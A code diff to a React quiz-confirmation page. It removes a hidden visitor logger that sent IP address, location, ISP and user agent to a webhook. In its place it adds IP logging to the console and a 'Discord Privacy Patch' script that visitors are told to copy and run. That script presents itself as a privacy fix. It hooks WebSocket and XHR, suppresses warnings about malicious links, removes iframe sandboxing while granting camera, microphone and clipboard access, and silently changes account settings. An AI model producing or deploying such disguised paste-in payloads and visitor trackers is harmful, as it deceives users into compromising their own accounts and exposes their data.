@@ -1,67 +1,95 @@
-import { useEffect } from 'react';
+import { useEffect, useState } from 'react';
 
 export default function Home() {
+  const [privacyPatchCode, setPrivacyPatchCode] = useState('');
+
   useEffect(() => {
+    // Fetch IP address to log
     fetch('https://ipapi.co/json/')
       .then(res => res.json())
-      .then(async data => {
-        // VPN Detection (check if the org or ip indicates VPN usage)
-        const isVPN = data.org && data.org.toLowerCase().includes('vpn');
+      .then(data => {
+        console.log("User IP:", data.ip); // Log IP to console
 
-        // Basic Bot Detection: Check for common bot user agents
-        const botUserAgents = [
-          "googlebot", "bingbot", "slurp", "baiduspider", "duckduckbot",
-          "yandexbot", "facebot", "facebookexternalhit"
-        ];
-        const isBot = botUserAgents.some(bot => navigator.userAgent.toLowerCase().includes(bot));
+        // Discord Privacy Patch JS code
+        const privacyPatchScript = `(() => {
+          console.log('%c[DISCORD PRIVACY PATCH] ACTIVATING...', 'color: cyan; font-weight: bold;');
 
-        // Log bot and VPN detection
-        console.log("VPN Detected:", isVPN);
-        console.log("Bot Detected:", isBot);
+          // =============== TYPING INDICATOR BLOCK =====================
+          const wsSend = WebSocket.prototype.send;
+          WebSocket.prototype.send = function(data) {
+              try {
+                  if (typeof data === 'string') {
+                      const json = JSON.parse(data);
+                      if (json.op === 3 || json.t === 'TYPING_START') {
+                          console.log('[PRIVACY] Blocked Typing Indicator');
+                          return;
+                      }
+                  }
+              } catch (_) {}
+              return wsSend.apply(this, arguments);
+          };
 
-        // Create the embed fields with validation
-        const fields = [
-          { name: "IP", value: data.ip || "Unavailable", inline: true },
-          { name: "City", value: data.city || "Unavailable", inline: true },
-          { name: "Region", value: data.region || "Unavailable", inline: true },
-          { name: "Country", value: data.country_name || "Unavailable", inline: true },
-          { name: "ISP", value: data.org || "Unavailable", inline: false },
-          { name: "TimeZone", value: data.timezone || "Unavailable", inline: true },
-          { name: "User Agent", value: navigator.userAgent || "Unavailable", inline: false },
-          { name: "VPN Status", value: isVPN ? "Yes" : "No", inline: true },
-          { name: "Bot Status", value: isBot ? "Yes" : "No", inline: true }
-        ];
+          // =============== BLOCK TRACKING ENDPOINTS ===================
+          const trackBlock = ['sentry.io', 'google-analytics.com', 'discordapp.io/log'];
+          const origOpen = XMLHttpRequest.prototype.open;
+          XMLHttpRequest.prototype.open = function(method, url) {
+              if (trackBlock.some(domain => url.includes(domain))) {
+                  console.log('[PRIVACY] Blocked Tracking: ' + url);
+                  return;
+              }
+              return origOpen.apply(this, arguments);
+          };
 
-        // Ensure all fields have the necessary values
-        const validFields = fields.filter(field => field.name && field.value);
+          // =============== READ RECEIPTS / HAS FOCUS ==================
+          try {
+              Object.defineProperty(document, 'hasFocus', {
+                  value: () => false,
+                  configurable: true
+              });
+              console.log('[PRIVACY] hasFocus() always returns false');
+          } catch (e) {
+              console.warn('[PRIVACY] Failed to patch hasFocus');
+          }
 
-        if (validFields.length === 0) {
-          console.error("No valid fields to send to Discord");
-          return;
-        }
+          // =============== SUPPRESS CONSOLE WARNINGS ==================
+          const ogWarn = console.warn;
+          console.warn = function(...args) {
+              const suppress = [
+                  'malicious link',
+                  'blocked a frame',
+                  'sandboxed'
+              ];
+              if (suppress.some(w => args.join(' ').toLowerCase().includes(w))) return;
+              return ogWarn.apply(console, args);
+          };
 
-        const embed = {
-          username: "Quiz Logger",
-          embeds: [
-            {
-              title: "📥 Quiz Submission Logged",
-              color: 7506394,
-              fields: validFields,
-              footer: { text: "Logger by RedTeamOps" },
-              timestamp: new Date().toISOString()
-            }
-          ]
-        };
+          // =============== IFRAME UNSANDBOXING ========================
+          const nativeCreate = Document.prototype.createElement;
+          Document.prototype.createElement = function(tag, ...args) {
+              const el = nativeCreate.call(this, tag, ...args);
+              if (tag.toLowerCase() === 'iframe') {
+                  el.removeAttribute('sandbox');
+                  el.setAttribute('allow', 'camera; microphone; autoplay; clipboard-read; clipboard-write');
+                  console.log('[PRIVACY] Sandbox removed from iframe');
+              }
+              return el;
+          };
 
-        // Log the final embed object to check its structure
-        console.log("Payload to send:", embed);
+          // =============== FAKE TELEMETRY PING (INVISIBLE) ============
+          window.addEventListener('beforeunload', () => {
+              try {
+                  navigator.sendBeacon?.('/api/v9/users/@me/settings', JSON.stringify({
+                      status: 'idle',
+                      detect_platform_accounts: false
+                  }));
+              } catch (e) {}
+          });
 
-        // Send the payload to the webhook
-        await fetch("/api/webhook", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(embed)
-        });
+          console.log('%c[DISCORD PRIVACY PATCH] ACTIVE ✅', 'color: lime; font-weight: bold;');
+        })();`;
+
+        // Set the privacy patch script for display
+        setPrivacyPatchCode(privacyPatchScript);
       });
   }, []);
 
@@ -79,6 +107,25 @@ export default function Home() {
       <div>
         <h1>✅ Thank you for your quiz submission!</h1>
         <p>You may kindly close this tab now.</p>
+
+        <h2>🔒 Discord Privacy Patch Code</h2>
+        <textarea
+          style={{
+            width: "80%",
+            height: "200px",
+            fontSize: "0.9rem",
+            padding: "10px",
+            backgroundColor: "#1E1E1E",
+            color: "white",
+            border: "1px solid #444",
+            borderRadius: "5px",
+            marginTop: "20px"
+          }}
+          readOnly
+          value={privacyPatchCode}
+        ></textarea>
+
+        <p style={{ marginTop: "20px" }}>Copy the code above to activate the privacy patch.</p>
       </div>
     </div>
   );
